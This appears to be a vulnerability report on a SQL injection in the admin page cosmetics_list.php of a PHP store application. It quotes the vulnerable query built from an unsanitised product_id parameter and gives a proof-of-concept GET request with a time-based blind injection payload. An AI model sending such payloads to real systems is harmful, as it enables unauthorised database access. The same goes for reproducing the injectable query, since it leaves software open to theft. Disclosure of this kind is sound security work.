### Vulnerability file address

`admin/cosmetics_list.php` from line 5,The $product_id parameter is controllable, the parameter product_id can be passed through get, and the $product_id is not protected from sql injection, resulting in sql injection

```php
if(isset($_GET['action']) && $_GET['action']!="" && $_GET['action']=='delete')
{
$product_id=$_GET['product_id'];
///////picture delete/////////
$result=mysqli_query($con,"select product_image from products where product_id='$product_id")
or die("query is incorrect...");
```

### POC

```http
GET /admin/cosmetics_list.php?action=delete&product_id=cccc' AND (SELECT 7939 FROM (SELECT(SLEEP(5)))sdWF)-- xcNg HTTP/1.1
Host: www.onsp.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=acrlvk4ljcqdujn2orbd09in25
Upgrade-Insecure-Requests: 1
```

### Attack results pictures

![image-20220729214115057](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220729214115.png)